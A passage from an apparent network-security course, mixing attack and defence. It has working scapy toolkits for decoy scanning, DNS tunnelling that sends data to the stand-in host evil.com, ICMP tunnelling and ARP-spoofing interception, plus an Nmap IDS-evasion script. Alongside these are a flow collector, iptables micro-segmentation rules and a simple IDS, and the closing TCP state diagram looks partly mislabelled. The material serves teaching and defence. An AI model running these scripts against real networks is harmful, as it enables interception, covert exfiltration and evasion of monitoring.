Hides the real source among fake sources
"""

from scapy.all import *
import random

def generate_random_ip():
    """Generate a random IP address"""
    return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"

def decoy_scan(target_ip, target_port, num_decoys=10):
    """
    Perform a decoy scan
    Sends SYN packets from real IP and fake IPs
    """
    print(f"[*] Decoy Scan: {target_ip}:{target_port} with {num_decoys} decoys")
    
    # Get our real IP
    real_ip = conf.route.route("0.0.0.0")[1]
    print(f"[*] Real source IP: {real_ip}")
    
    # Generate decoy IPs
    decoy_ips = [generate_random_ip() for _ in range(num_decoys)]
    print(f"[*] Decoy IPs: {', '.join(decoy_ips[:3])}... (+{num_decoys-3} more)")
    
    # Mix real IP among decoys
    all_ips = decoy_ips + [real_ip]
    random.shuffle(all_ips)
    
    # Send SYN from each IP
    for src_ip in all_ips:
        packet = IP(src=src_ip, dst=target_ip)/TCP(dport=target_port, flags="S")
        send(packet, verbose=0)
        if src_ip == real_ip:
            print(f"[*] Sent packet from REAL IP: {src_ip}")
        else:
            print(f"[*] Sent packet from DECOY: {src_ip}")
        time.sleep(0.1)
    
    # Only the real IP will receive the response
    print(f"\n[*] Listening for response to {real_ip}...")
    response = sr1(IP(dst=target_ip)/TCP(dport=target_port, flags="S"), 
                   timeout=3, verbose=0)
    
    if response:
        if TCP in response and response[TCP].flags == "SA":
            print(f"[+] Port {target_port} is OPEN")
        else:
            print(f"[-] Port {target_port} is CLOSED")
    else:
        print(f"[?] No response received")

# Example usage
if __name__ == "__main__":
    target = input("[?] Target IP: ")
    port = int(input("[?] Target Port: "))
    decoys = int(input("[?] Number of decoys (default 10): ") or "10")
    
    decoy_scan(target, port, decoys)
```

### 5.3 Protocol Tunneling (Layer 7 over Layer X)

- **DNS Tunneling**: Encodes binary C2 data into alphanumeric DNS queries (`base64_data.evil.com`). The DNS hierarchy forwards these recursively to the attacker's Authoritative Name Server.
- **ICMP Tunneling**: Uses the data field of Echo Requests.
- **Defense**: You cannot block DNS or ICMP without breaking the network. You must inspect the *volume* and *content* (entropy).

#### 5.3.1 DNS Tunneling Implementation

```python
#!/usr/bin/env python3
"""
DNS Tunneling Example
Exfiltrates data through DNS queries
"""

from scapy.all import *
import base64

def exfiltrate_via_dns(data, domain="evil.com", dns_server="8.8.8.8"):
    """
    Exfiltrate data through DNS queries
    Splits data into chunks and sends as subdomain queries
    """
    print(f"[*] DNS Tunneling: Exfiltrating {len(data)} bytes")
    
    # Encode data to base64 (DNS-safe)
    encoded = base64.b64encode(data.encode()).decode()
    print(f"[*] Encoded to base64: {len(encoded)} characters")
    
    # Split into 63-character chunks (DNS label limit)
    chunk_size = 63
    chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
    
    print(f"[*] Split into {len(chunks)} DNS queries")
    
    # Send each chunk as a DNS query
    for i, chunk in enumerate(chunks):
        # Create query: chunk-ID-sequence.domain
        query = f"{chunk}.{i}.{domain}"
        
        print(f"[*] Query {i+1}/{len(chunks)}: {query[:50]}...")
        
        # Send DNS query
        dns_query = IP(dst=dns_server)/UDP(dport=53)/DNS(qd=DNSQR(qname=query))
        response = sr1(dns_query, timeout=2, verbose=0)
        
        if response:
            print(f"    [+] Response received")
        else:
            print(f"    [-] No response")
        
        time.sleep(0.5)
    
    print(f"[+] Exfiltration complete: {len(chunks)} queries sent")

def dns_tunnel_server_simulation():
    """
    Simulates a DNS server that receives tunneled data
    """
    print("[*] DNS Tunnel Server - Listening for queries...")
    print("[*] (Ctrl+C to stop)")
    
    def process_dns(packet):
        if DNS in packet and packet[DNS].qr == 0:  # Query
            query = packet[DNS].qd.qname.decode()
            print(f"\n[*] Received DNS query: {query}")
            
            # Extract data (subdomain before domain)
            if ".evil.com" in query:
                data_chunk = query.split('.')[0]
                print(f"[*] Data chunk extracted: {data_chunk[:50]}...")
    
    # Sniff DNS traffic
    sniff(filter="udp port 53", prn=process_dns, store=0)

# Example usage
if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════╗
║            DNS TUNNELING TOOLKIT                         ║
║            WARNING: Educational Use Only!                ║
╚══════════════════════════════════════════════════════════╝

1. Exfiltrate data via DNS
2. Simulate DNS tunnel server
3. Exit
    """)
    
    choice = input("[?] Select option (1-3): ")
    
    if choice == "1":
        data = input("[?] Enter data to exfiltrate: ")
        domain = input("[?] Attacker domain (default: evil.com): ") or "evil.com"
        dns_server = input("[?] DNS server (default: 8.8.8.8): ") or "8.8.8.8"
        exfiltrate_via_dns(data, domain, dns_server)
    
    elif choice == "2":
        dns_tunnel_server_simulation()
    
    else:
        print("[*] Exiting...")
```

#### 5.3.2 ICMP Tunneling Implementation

```python
#!/usr/bin/env python3
"""
ICMP Tunneling Example
Hides data in ICMP ping packets
"""

from scapy.all import *

def send_icmp_tunnel(target_ip, data):
    """
    Send data hidden in ICMP echo requests
    """
    print(f"[*] ICMP Tunneling to {target_ip}")
    print(f"[*] Data size: {len(data)} bytes")
    
    # Split data into chunks (max 1400 bytes per packet)
    chunk_size = 1400
    chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
    
    print(f"[*] Sending {len(chunks)} ICMP packets...")
    
    for i, chunk in enumerate(chunks):
        # Create ICMP echo request with data in payload
        packet = IP(dst=target_ip)/ICMP(type=8, code=0)/Raw(load=chunk)
        
        print(f"[*] Packet {i+1}/{len(chunks)}: {len(chunk)} bytes")
        
        # Send and wait for response
        response = sr1(packet, timeout=2, verbose=0)
        
        if response:
            print(f"    [+] Response received from {response[IP].src}")
        else:
            print(f"    [-] No response")
        
        time.sleep(0.2)
    
    print(f"[+] Tunnel complete: {len(data)} bytes sent in {len(chunks)} packets")

def receive_icmp_tunnel():
    """
    Receive and extract data from ICMP tunnels
    """
    print("[*] ICMP Tunnel Receiver - Listening...")
    print("[*] (Ctrl+C to stop)\n")
    
    received_data = []
    
    def process_icmp(packet):
        if ICMP in packet and packet[ICMP].type == 8:  # Echo request
            if Raw in packet:
                data = packet[Raw].load
                print(f"[*] Received ICMP with {len(data)} bytes of data")
                print(f"    Data: {data[:100]}...")
                received_data.append(data)
    
    try:
        sniff(filter="icmp", prn=process_icmp, store=0)
    except KeyboardInterrupt:
        print(f"\n[*] Total packets received: {len(received_data)}")
        if received_data:
            total = b"".join(received_data)
            print(f"[*] Total data: {len(total)} bytes")
            print(f"[*] Decoded: {total.decode(errors='ignore')[:200]}...")

# Example usage
if __name__ == "__main__":
    print("""
╔══════════════════════════════════════════════════════════╗
║            ICMP TUNNELING TOOLKIT                        ║
║            WARNING: Educational Use Only!                ║
╚══════════════════════════════════════════════════════════╝

1. Send data via ICMP tunnel
2. Receive ICMP tunnel data
3. Exit
    """)
    
    choice = input("[?] Select option (1-3): ")
    
    if choice == "1":
        target = input("[?] Target IP: ")
        data = input("[?] Enter data to send: ")
        send_icmp_tunnel(target, data.encode())
    
    elif choice == "2":
        receive_icmp_tunnel()
    
    else:
        print("[*] Exiting...")
```

**For Beginners - Understanding Tunneling:**

Think of tunneling like hiding a secret message inside a normal letter:

1. **Normal Communication:**
   - You write: "Hello, how are you?"
   - Post office delivers it
   
2. **Tunneling:**
   - You write: "Hello, how are you?" (looks normal)
   - But the first letter of each word spells: "HHA" (hidden message)
   - Post office delivers the normal-looking letter
   - Receiver extracts the hidden message

In networking:
- **DNS Tunneling**: Hide data in website name lookups
- **ICMP Tunneling**: Hide data in ping packets
- **HTTP Tunneling**: Hide data in web requests

Firewalls allow these protocols, so attackers abuse them!

### 5.4 Layer 2 Attacks: ARP Spoofing

```python
#!/usr/bin/env python3
"""
ARP Spoofing Attack
Intercepts traffic between victim and gateway
"""

from scapy.all import *
import time
import sys

def get_mac(ip):
    """Get MAC address for an IP"""
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip):
    """
    Send ARP packet to target claiming to be spoof_ip
    """
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[-] Could not find MAC for {target_ip}")
        return False
    
    # Create ARP reply packet
    # "I am spoof_ip and my MAC is <attacker_mac>"
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)
    return True

def restore(destination_ip, source_ip):
    """
    Restore ARP tables to normal
    """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, 
                 psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)

def arp_spoof_attack(target_ip, gateway_ip):
    """
    Main ARP spoofing attack
    Position ourselves as man-in-the-middle
    """
    print(f"""
[*] Starting ARP Spoofing Attack
[*] Target: {target_ip}
[*] Gateway: {gateway_ip}
[*] Press Ctrl+C to stop
    """)
    
    # Enable IP forwarding to actually forward packets
    print("[*] Enabling IP forwarding...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")
    
    packet_count = 0
    
    try:
        while True:
            # Tell target we are the gateway
            spoof(target_ip, gateway_ip)
            
            # Tell gateway we are the target
            spoof(gateway_ip, target_ip)
            
            packet_count += 2
            print(f"\r[*] Packets sent: {packet_count}", end="")
            sys.stdout.flush()
            
            time.sleep(2)
    
    except KeyboardInterrupt:
        print("\n[*] Stopping ARP spoofing...")
        print("[*] Restoring ARP tables...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[*] ARP tables restored")
        
        # Disable IP forwarding
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null")
        print("[+] Attack stopped")

def detect_arp_spoofing():
    """
    Detect potential ARP spoofing attacks
    Looks for duplicate IPs with different MACs
    """
    print("[*] ARP Spoofing Detector")
    print("[*] Monitoring ARP traffic...")
    print("[*] (Ctrl+C to stop)\n")
    
    arp_table = {}  # {ip: [mac1, mac2, ...]}
    
    def process_arp(packet):
        if ARP in packet and packet[ARP].op == 2:  # ARP reply
            ip = packet[ARP].psrc
            mac = packet[ARP].hwsrc
            
            if ip in arp_table:
                if mac not in arp_table[ip]:
                    print(f"\n[!] ALERT: ARP Spoofing Detected!")
                    print(f"    IP: {ip}")
                    print(f"    Old MAC: {arp_table[ip]}")
                    print(f"    New MAC: {mac}")
                    arp_table[ip].append(mac)
            else:
                arp_table[ip] = [mac]
                print(f"[*] Learned: {ip} -> {mac}")
    
    try:
        sniff(filter="arp", prn=process_arp, store=0)
    except KeyboardInterrupt:
        print("\n[*] Stopped monitoring")
        print(f"\n[*] ARP Table ({len(arp_table)} entries):")
        for ip, macs in arp_table.items():
            print(f"    {ip}: {macs}")

# Example usage
if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] This script requires root privileges")
        sys.exit(1)
    
    print("""
╔══════════════════════════════════════════════════════════╗
║            ARP SPOOFING TOOLKIT                          ║
║            WARNING: Educational Use Only!                ║
╚══════════════════════════════════════════════════════════╝

1. Perform ARP spoofing attack (MITM)
2. Detect ARP spoofing
3. Exit
    """)
    
    choice = input("[?] Select option (1-3): ")
    
    if choice == "1":
        target = input("[?] Target IP: ")
        gateway = input("[?] Gateway IP: ")
        arp_spoof_attack(target, gateway)
    
    elif choice == "2":
        detect_arp_spoofing()
    
    else:
        print("[*] Exiting...")
```

---

## 6. Blue Team Perspective: Visibility & Controls

### 6.1 The Visibility Triad

To see the truth, you need three levels of logs:
1.  **Full Packet Capture (PCAP)**: The gold standard. Heavy storage. (Wireshark/Arkime).
2.  **Flow Data (NetFlow/IPFIX)**: "Metadata". Who talked to who, when, how long, how many bytes. (No payload). Good for spotting huge exfiltration.
3.  **Transaction Logs**: Layer 7 summaries. (Zeek/Suricata/IIS Logs). "User A accessed URL B".

#### 6.1.1 NetFlow Collection Example

```python
#!/usr/bin/env python3
"""
NetFlow Generator
Creates network flow records for analysis
"""

from scapy.all import *
from collections import defaultdict
import time
import json

class FlowCollector:
    def __init__(self):
        self.flows = defaultdict(lambda: {
            'packets': 0,
            'bytes': 0,
            'start_time': None,
            'end_time': None,
            'flags': set()
        })
    
    def process_packet(self, packet):
        """Process a packet and update flow records"""
        if IP in packet:
            # Create flow key (5-tuple)
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            
            if TCP in packet:
                proto = 6
                src_port = packet[TCP].sport
                dst_port = packet[TCP].dport
                flags = packet[TCP].flags
            elif UDP in packet:
                proto = 17
                src_port = packet[UDP].sport
                dst_port = packet[UDP].dport
                flags = None
            else:
                return
            
            # Bidirectional flow key (sorted)
            flow_key = tuple(sorted([
                (src_ip, src_port, dst_ip, dst_port, proto),
                (dst_ip, dst_port, src_ip, src_port, proto)
            ])[0])
            
            # Update flow
            flow = self.flows[flow_key]
            flow['packets'] += 1
            flow['bytes'] += len(packet)
            
            current_time = time.time()
            if flow['start_time'] is None:
                flow['start_time'] = current_time
            flow['end_time'] = current_time
            
            if flags:
                flow['flags'].add(str(flags))
    
    def get_flows(self):
        """Return flow records"""
        result = []
        for flow_key, flow_data in self.flows.items():
            src_ip, src_port, dst_ip, dst_port, proto = flow_key
            
            duration = (flow_data['end_time'] - flow_data['start_time']) 
            if duration == 0:
                duration = 0.001
            
            result.append({
                'src_ip': src_ip,
                'src_port': src_port,
                'dst_ip': dst_ip,
                'dst_port': dst_port,
                'protocol': 'TCP' if proto == 6 else 'UDP',
                'packets': flow_data['packets'],
                'bytes': flow_data['bytes'],
                'duration': round(duration, 3),
                'bps': int(flow_data['bytes'] * 8 / duration),
                'pps': int(flow_data['packets'] / duration),
                'flags': list(flow_data['flags'])
            })
        
        return result
    
    def print_flows(self):
        """Print flow table"""
        flows = self.get_flows()
        
        print("\n" + "="*100)
        print("NETWORK FLOW TABLE")
        print("="*100)
        print(f"{'Source':<22} {'Destination':<22} {'Proto':<6} {'Packets':<8} {'Bytes':<10} {'Duration':<8} {'bps':<12}")
        print("-"*100)
        
        for flow in sorted(flows, key=lambda x: x['bytes'], reverse=True):
            src = f"{flow['src_ip']}:{flow['src_port']}"
            dst = f"{flow['dst_ip']}:{flow['dst_port']}"
            print(f"{src:<22} {dst:<22} {flow['protocol']:<6} {flow['packets']:<8} {flow['bytes']:<10} {flow['duration']:<8} {flow['bps']:<12}")
        
        print("="*100)
        print(f"Total Flows: {len(flows)}")
    
    def detect_anomalies(self):
        """Detect potential security issues in flows"""
        flows = self.get_flows()
        
        print("\n" + "="*100)
        print("ANOMALY DETECTION")
        print("="*100)
        
        for flow in flows:
            alerts = []
            
            # High bandwidth flow
            if flow['bytes'] > 10000000:  # > 10 MB
                alerts.append(f"HIGH_BANDWIDTH: {flow['bytes']/1000000:.2f} MB")
            
            # High packet rate
            if flow['pps'] > 1000:
                alerts.append(f"HIGH_PPS: {flow['pps']} packets/sec")
            
            # Port scanning (many packets, few bytes)
            if flow['packets'] > 100 and flow['bytes']/flow['packets'] < 100:
                alerts.append("POSSIBLE_PORT_SCAN")
            
            # Long-duration flow
            if flow['duration'] > 3600:  # > 1 hour
                alerts.append(f"LONG_DURATION: {flow['duration']/3600:.2f} hours")
            
            # SYN flood indicator
            if 'S' in flow['flags'] and 'A' not in flow['flags'] and flow['packets'] > 50:
                alerts.append("POSSIBLE_SYN_FLOOD")
            
            if alerts:
                print(f"\n[!] ALERT: {flow['src_ip']}:{flow['src_port']} -> {flow['dst_ip']}:{flow['dst_port']}")
                for alert in alerts:
                    print(f"    - {alert}")

def live_flow_collection(interface="eth0", duration=60):
    """
    Collect flows from live traffic
    """
    print(f"[*] Collecting flows on {interface} for {duration} seconds...")
    
    collector = FlowCollector()
    
    def packet_handler(packet):
        collector.process_packet(packet)
    
    # Sniff for specified duration
    sniff(iface=interface, prn=packet_handler, timeout=duration, store=0)
    
    # Display results
    collector.print_flows()
    collector.detect_anomalies()

# Example usage
if __name__ == "__main__":
    interface = input("[?] Interface to monitor (default: eth0): ") or "eth0"
    duration = int(input("[?] Collection duration in seconds (default: 60): ") or "60")
    
    live_flow_collection(interface, duration)
```

### 6.2 Zero Trust Networking

**Traditional Model**: "Hard outer shell (Firewall), soft chewy center." Once you pass the firewall, you are trusted.
**Zero Trust**: "Assume Breach." Every packet, even from the inside, must be authenticated and authorized.
- **Micro-segmentation**: Using host-based firewalls to prevent Laptop A from talking to Laptop B (stopping Lateral Movement).

#### 6.2.1 Implementing Micro-Segmentation with iptables

```bash
#!/bin/bash
# Micro-Segmentation Script
# Implements Zero Trust at host level

echo "[*] Implementing Zero Trust Micro-Segmentation"

# 1. Default Deny All
echo "[*] Setting default policies to DROP"
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT DROP

# 2. Allow Established Connections
echo "[*] Allowing established connections"
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# 3. Allow Loopback
echo "[*] Allowing loopback traffic"
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

# 4. Allow Specific Services (Whitelisting)
echo "[*] Allowing specific outbound services"
# DNS
iptables -A OUTPUT -p udp --dport 53 -j ACCEPT
# HTTPS
iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
# NTP
iptables -A OUTPUT -p udp --dport 123 -j ACCEPT

# 5. Allow Inbound SSH from Management Network Only
MGMT_NETWORK="10.0.0.0/24"
echo "[*] Allowing SSH from management network: $MGMT_NETWORK"
iptables -A INPUT -p tcp -s $MGMT_NETWORK --dport 22 -m state --state NEW -j ACCEPT

# 6. Block Lateral Movement (Inter-host communication)
echo "[*] Blocking lateral movement between hosts"
INTERNAL_NETWORK="192.168.1.0/24"
iptables -A OUTPUT -d $INTERNAL_NETWORK -p tcp --dport 445 -j DROP  # SMB
iptables -A OUTPUT -d $INTERNAL_NETWORK -p tcp --dport 3389 -j DROP  # RDP
iptables -A OUTPUT -d $INTERNAL_NETWORK -p tcp --dport 5985 -j DROP  # WinRM

# 7. Logging
echo "[*] Enabling logging for dropped packets"
iptables -A INPUT -j LOG --log-prefix "IPTABLES-INPUT-DROP: " --log-level 4
iptables -A OUTPUT -j LOG --log-prefix "IPTABLES-OUTPUT-DROP: " --log-level 4

echo "[+] Micro-segmentation rules applied"
echo "[*] Current rules:"
iptables -L -v -n
```

### 6.3 IDS/IPS Deployment

```python
#!/usr/bin/env python3
"""
Simple Intrusion Detection System (IDS)
Monitors traffic for suspicious patterns
"""

from scapy.all import *
from collections import defaultdict
import time

class SimpleIDS:
    def __init__(self):
        self.connection_tracker = defaultdict(list)
        self.syn_tracker = defaultdict(int)
        self.port_scan_tracker = defaultdict(set)
        self.start_time = time.time()
    
    def detect_port_scan(self, packet):
        """Detect port scanning activity"""
        if TCP in packet and packet[TCP].flags == "S":
            src_ip = packet[IP].src
            dst_port = packet[TCP].dport
            
            # Track unique ports contacted
            self.port_scan_tracker[src_ip].add(dst_port)
            
            # Alert if more than 10 different ports in short time
            if len(self.port_scan_tracker[src_ip]) > 10:
                print(f"\n[!] PORT SCAN DETECTED")
                print(f"    Source: {src_ip}")
                print(f"    Ports scanned: {len(self.port_scan_tracker[src_ip])}")
                print(f"    Ports: {sorted(list(self.port_scan_tracker[src_ip]))[:20]}...")
                # Reset to avoid spam
                self.port_scan_tracker[src_ip] = set()
    
    def detect_syn_flood(self, packet):
        """Detect SYN flood attacks"""
        if TCP in packet and packet[TCP].flags == "S":
            dst_ip = packet[IP].dst
            dst_port = packet[TCP].dport
            key = f"{dst_ip}:{dst_port}"
            
            self.syn_tracker[key] += 1
            
            # Alert if more than 100 SYNs per second
            elapsed = time.time() - self.start_time
            if elapsed > 0:
                rate = self.syn_tracker[key] / elapsed
                if rate > 100:
                    print(f"\n[!] SYN FLOOD DETECTED")
                    print(f"    Target: {key}")
                    print(f"    SYN Rate: {rate:.2f} packets/sec")
                    print(f"    Total SYNs: {self.syn_tracker[key]}")
    
    def detect_dns_tunneling(self, packet):
        """Detect DNS tunneling based on query characteristics"""
        if DNS in packet and packet[DNS].qr == 0:  # Query
            query = packet[DNS].qd.qname.decode()
            
            # Check for suspicious patterns
            subdomain = query.split('.')[0]
            
            # Long subdomain (> 50 chars)
            if len(subdomain) > 50:
                print(f"\n[!] SUSPICIOUS DNS QUERY")
                print(f"    Possible DNS tunneling detected")
                print(f"    Query: {query}")
                print(f"    Subdomain length: {len(subdomain)}")
            
            # High entropy subdomain (random-looking)
            if len(set(subdomain)) / len(subdomain) > 0.7:  # High character diversity
                print(f"\n[!] HIGH ENTROPY DNS QUERY")
                print(f"    Query: {query}")
                print(f"    Possible encoded data")
    
    def detect_data_exfiltration(self, packet):
        """Detect potential data exfiltration"""
        if IP in packet:
            # Track outbound data volume
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            
            # Check if outbound (simple heuristic)
            if packet[IP].src.startswith("192.168"):  # Internal network
                if not packet[IP].dst.startswith("192.168"):  # External
                    packet_size = len(packet)
                    
                    key = f"{src_ip}->{dst_ip}"
                    self.connection_tracker[key].append(packet_size)
                    
                    # Alert if > 10 MB transferred
                    total_bytes = sum(self.connection_tracker[key])
                    if total_bytes > 10000000:  # 10 MB
                        print(f"\n[!] LARGE DATA TRANSFER DETECTED")
                        print(f"    Flow: {key}")
                        print(f"    Total: {total_bytes/1000000:.2f} MB")
                        print(f"    Packets: {len(self.connection_tracker[key])}")
                        # Reset
                        self.connection_tracker[key] = []
    
    def detect_xmas_scan(self, packet):
        """Detect XMAS scan (FIN, PSH, URG flags set)"""
        if TCP in packet:
            flags = packet[TCP].flags
            if flags == "FPU":  # FIN + PSH + URG
                print(f"\n[!] XMAS SCAN DETECTED")
                print(f"    Source: {packet[IP].src}")
                print(f"    Target: {packet[IP].dst}:{packet[TCP].dport}")
    
    def detect_null_scan(self, packet):
        """Detect NULL scan (no flags set)"""
        if TCP in packet:
            if packet[TCP].flags == 0:
                print(f"\n[!] NULL SCAN DETECTED")
                print(f"    Source: {packet[IP].src}")
                print(f"    Target: {packet[IP].dst}:{packet[TCP].dport}")
    
    def analyze_packet(self, packet):
        """Main packet analysis function"""
        if IP in packet:
            self.detect_port_scan(packet)
            self.detect_syn_flood(packet)
            self.detect_data_exfiltration(packet)
            self.detect_xmas_scan(packet)
            self.detect_null_scan(packet)
        
        if DNS in packet:
            self.detect_dns_tunneling(packet)

def run_ids(interface="eth0"):
    """
    Run the IDS on specified interface
    """
    print(f"""
╔══════════════════════════════════════════════════════════╗
║            SIMPLE INTRUSION DETECTION SYSTEM             ║
║            Monitoring: {interface:<39} ║
╚══════════════════════════════════════════════════════════╝

[*] Starting packet capture...
[*] Press Ctrl+C to stop

    """)
    
    ids = SimpleIDS()
    
    try:
        sniff(iface=interface, prn=ids.analyze_packet, store=0)
    except KeyboardInterrupt:
        print("\n[*] Stopping IDS...")
        
        # Print statistics
        print(f"\n{'='*60}")
        print("IDS STATISTICS")
        print(f"{'='*60}")
        elapsed = time.time() - ids.start_time
        print(f"Runtime: {elapsed:.2f} seconds")
        print(f"Unique IPs scanned from: {len(ids.port_scan_tracker)}")
        print(f"Active flows tracked: {len(ids.connection_tracker)}")

# Example usage
if __name__ == "__main__":
    interface = input("[?] Interface to monitor (default: eth0): ") or "eth0"
    run_ids(interface)
```

**For Beginners - Understanding IDS:**

An IDS (Intrusion Detection System) is like a security camera:

1. **Signature-Based Detection**: Recognizes known attack patterns
   - Like recognizing a burglar's face from a photo
   - Fast but only catches known attacks

2. **Anomaly-Based Detection**: Detects unusual behavior
   - Like noticing someone entering at 3 AM (unusual time)
   - Catches new attacks but may have false positives

3. **Heuristic Detection**: Uses rules and intelligence
   - Like knowing "100 login attempts in 1 minute = attack"
   - Balances accuracy and detection of new threats

---

## 7. Practical Lab: Fragmentation & Evasion

> [!WARNING]
> This lab requires a safe, isolated environment. Do not run fragmentation scans against public networks.

### Lab Objective
Observe how splitting packets affects detection.

**Step 1: Standard Scan**
Run a standard Nmap scan against a target VM and capture the traffic with Wireshark.
```bash
sudo nmap -sS -p 80 192.168.1.50
```
*Analysis*: You will see standard TCP SYN packets. The "IP Fragmentation" bit will usually be set to "Don't Fragment".

**Step 2: Fragmentation Scan**
Run a fragmented scan.
```bash
sudo nmap -f -sS -p 80 192.168.1.50
# -f splits packets into 8-byte chunks
```
*Analysis*:
- Look at the **IP Header**. You will see the "More Fragments" (MF) flag set on the first packets.
- Look at the **Fragment Offset**.
- Wireshark might struggle to decode the TCP header of the first fragment because it's incomplete.
- This effectively hides the "SYN" flag from simple packet filters that only look at the first X bytes of a packet.

**Step 3: MTU Manipulation**
Manually lower your interface MTU to force fragmentation.
```bash
sudo ifconfig eth0 mtu 500
ping -s 1000 192.168.1.50
```
*Analysis*: Observe how the OS handles a 1000-byte ping when the interface can only send 500 bytes. It splits it automatically.

### Lab 7.1: Complete Evasion Testing Suite

```bash
#!/bin/bash
# Comprehensive Evasion Testing Lab
# Tests various IDS/Firewall evasion techniques

TARGET="192.168.1.50"
INTERFACE="eth0"

echo "╔══════════════════════════════════════════════════════════╗"
echo "║        NETWORK EVASION TESTING LAB                       ║"
echo "║        Target: $TARGET                                   "
echo "╚══════════════════════════════════════════════════════════╝"
echo ""

# Test 1: Standard Scan (Baseline)
echo "[TEST 1] Standard SYN Scan (Baseline)"
echo "---------------------------------------"
sudo nmap -sS -p 80,443,8080 $TARGET -Pn -v
echo ""
read -p "Press Enter to continue..."

# Test 2: Fragmented Scan
echo "[TEST 2] Fragmented SYN Scan (-f)"
echo "---------------------------------------"
sudo nmap -f -sS -p 80,443,8080 $TARGET -Pn -v
echo ""
read -p "Press Enter to continue..."

# Test 3: Tiny Fragments
echo "[TEST 3] Tiny Fragment Scan (--mtu 8)"
echo "---------------------------------------"
sudo nmap --mtu 8 -sS -p 80,443,8080 $TARGET -Pn -v
echo ""
read -p "Press Enter to continue..."

# Test 4: Decoy Scan
echo "[TEST 4] Decoy Scan (10 decoys)"
echo "---------------------------------------"
sudo nmap -D RND:10 -sS -p 80,443,8080 $TARGET -Pn -v
echo ""
read -p "Press Enter to continue..."

# Test 5: Source Port Manipulation
echo "[TEST 5] Source Port 53 (DNS)"
echo "---------------------------------------"
sudo nmap --source-port 53 -sS -p 80,443,8080 $TARGET -Pn -v
echo ""
read -p "Press Enter to continue..."

# Test 6: Slow Scan (Timing)
echo "[TEST 6] Slow Scan (-T1 Sneaky)"
echo "---------------------------------------"
sudo nmap -T1 -sS -p 80,443,8080 $TARGET -Pn -v
echo ""
read -p "Press Enter to continue..."

# Test 7: Idle Scan (Zombie)
echo "[TEST 7] Idle/Zombie Scan"
echo "---------------------------------------"
echo "Note: Requires a zombie host (Windows XP or similar)"
ZOMBIE="192.168.1.100"
sudo nmap -sI $ZOMBIE -p 80,443,8080 $TARGET -Pn -v
echo ""
read -p "Press Enter to continue..."

# Test 8: FIN Scan
echo "[TEST 8] FIN Scan"
echo "---------------------------------------"
sudo nmap -sF -p 80,443,8080 $TARGET -Pn -v
echo ""
read -p "Press Enter to continue..."

# Test 9: XMAS Scan
echo "[TEST 9] XMAS Scan"
echo "---------------------------------------"
sudo nmap -sX -p 80,443,8080 $TARGET -Pn -v
echo ""
read -p "Press Enter to continue..."

# Test 10: NULL Scan
echo "[TEST 10] NULL Scan"
echo "---------------------------------------"
sudo nmap -sN -p 80,443,8080 $TARGET -Pn -v
echo ""

echo "╔══════════════════════════════════════════════════════════╗"
echo "║        ALL TESTS COMPLETE                                ║"
echo "╚══════════════════════════════════════════════════════════╝"
```

---

## 8. Advanced Protocol Analysis

### 8.1 TCP Three-Way Handshake Deep Dive

```
Client                                Server
  |                                      |
  |  SYN (Seq=1000, Ack=0)              |
  |------------------------------------->|
  |                                      |
  |       SYN-ACK (Seq=2000, Ack=1001)   |
  |<-------------------------------------|
  |                                      |
  |  ACK (Seq=1001, Ack=2001)           |
  |------------------------------------->|
  |                                      |
  |  [Connection Established]            |
```

**Detailed Packet Analysis:**

**Packet 1: SYN**
```
TCP Flags: SYN
Sequence Number: 1000 (random initial)
Acknowledgment: 0 (not yet acknowledging anything)
Window Size: 65535
Options: MSS=1460, SACK_PERM, Timestamps, Window Scale=7
```

**Packet 2: SYN-ACK**
```
TCP Flags: SYN, ACK
Sequence Number: 2000 (server's random initial)
Acknowledgment: 1001 (client's seq + 1)
Window Size: 65535
Options: MSS=1460, SACK_PERM, Timestamps, Window Scale=7
```

**Packet 3: ACK**
```
TCP Flags: ACK
Sequence Number: 1001
Acknowledgment: 2001 (server's seq + 1)
Window Size: 65535
```

### 8.2 TCP State Machine

```
                        ┌─────────────┐
                        │   CLOSED    │
                        └──────┬──────┘
                               │
                        PASSIVE│ACTIVE
                         OPEN  │ OPEN
                               │
                    ┌──────────┴──────────┐
                    │                     │
                    ▼                     ▼
              ┌──────────┐         ┌──────────┐
              │  LISTEN  │         │SYN_SENT  │
              └────┬─────┘         └────┬─────┘
                   │                    │
            RCV SYN│               RCV  │SND SYN
            SND SYN│               SYN-ACK│ACK
            ACK    │                    │
                   │                    │
                   ▼                    ▼
              ┌──────────┐         ┌──────────┐
              │ SYN_RCVD │<────────│   ESTAB  │
              └────┬─────┘  SIMULT.└────┬─────┘
                   │        OPEN        │
           RCV ACK │                    │CLOSE
                   │                    │SND FIN
                   ▼                    ▼
              ┌──────────┐         ┌──────────┐
              │  ESTAB   │         │FIN_WAIT_1│
              └────┬─────┘         └────┬─────┘
                   │                    │
              CLOSE│                    │RCV FIN
              SND FIN                   │SND ACK
                   │                    │
                   ▼                    ▼
              ┌──────────┐         ┌──────────┐
              │FIN_WAIT_1│         │ CLOSING  │
              └────┬─────┘         └────┬─────┘
